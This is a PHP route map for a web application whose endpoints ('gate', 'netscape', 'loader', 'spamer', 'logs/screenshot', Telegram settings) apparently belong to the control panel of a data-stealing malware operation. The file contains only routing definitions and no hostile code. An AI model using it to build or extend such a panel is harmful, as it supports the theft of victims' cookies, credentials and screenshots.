<?php

return [

	'' => [
		'controller' => 'main',
		'action' => 'index',
	],
	'index' => [
		'controller' => 'main',
		'action' => 'index',
	],
	'login' => [
		'controller' => 'main',
		'action' => 'login',
	],
	'logout' => [
		'controller' => 'main',
		'action' => 'logout',
	],
	'gate' => [
		'controller' => 'main',
		'action' => 'gate',
	],
    'config' => [
        'controller' => 'main',
        'action' => 'config',
    ],
    'netscape' => [
        'controller' => 'main',
        'action' => 'netscape',
    ],
	'spamer/{type:\w+}' => [
        'controller' => 'main',
        'action' => 'spamer',
    ],
    'spamers' => [
        'controller' => 'main',
        'action' => 'spamers',
    ],
    'getTable/{type:\w+}' => [
        'controller' => 'main',
        'action' => 'getTable',
    ],
    'statistic/{token:\w+}' => [
        'controller' => 'main',
        'action' => 'statistic',
    ],
    'statistic' => [
        'controller' => 'main',
        'action' => 'statistic',
    ],
    'check' => [
        'controller' => 'main',
        'action' => 'check',
    ],
    'sockets' => [
        'controller' => 'main',
        'action' => 'sockets',
    ],
    'install' => [
        'controller' => 'main',
        'action' => 'install',
    ],
    'telegram' => [
        'controller' => 'main',
        'action' => 'telegram',
    ],
	'loader/{name:\w+}' => [
		'controller' => 'main',
		'action' => 'loader',
	],


    'settings/config' => [
        'controller' => 'settings',
        'action' => 'config',
    ],
    'settings/accounts' => [
        'controller' => 'settings',
        'action' => 'accounts',
    ],
    'settings/telegram' => [
        'controller' => 'settings',
        'action' => 'telegram',
    ],
    'settings/domains' => [
        'controller' => 'settings',
        'action' => 'domains',
    ],
    'settings/loader' => [
        'controller' => 'settings',
        'action' => 'loader',
    ],

    'settings/save/{type:\w+}' => [
        'controller' => 'settings',
        'action' => 'save',
    ],
    'settings/info/{type:\w+}' => [
        'controller' => 'settings',
        'action' => 'info',
    ],
    'settings/edit/{type:\w+}' => [
        'controller' => 'settings',
        'action' => 'edit',
    ],
    'settings/delete/{type:\w+}' => [
        'controller' => 'settings',
        'action' => 'delete',
    ],



    'logs' => [
        'controller' => 'logs',
        'action' => 'index',
    ],
    'logs/getTable/{table:\w+}' => [
        'controller' => 'logs',
        'action' => 'getTable',
    ],
    'logs/tags/{act:\w+}' => [
    	'controller' => 'logs',
    	'action' => 'tags',
    ],
    'logs/check/{id:\w+}' => [
    	'controller' => 'logs',
    	'action' => 'check',
    ],
    'logs/log/{act:\w+}' => [
    	'controller' => 'logs',
    	'action' => 'log',
    ],
    'logs/statistic/{type:\w+}' => [
        'controller' => 'logs',
        'action' => 'statistic',
    ],
    'logs/screenshot/{id:\w+}' => [
        'controller' => 'logs',
        'action' => 'screenshot',
    ],
];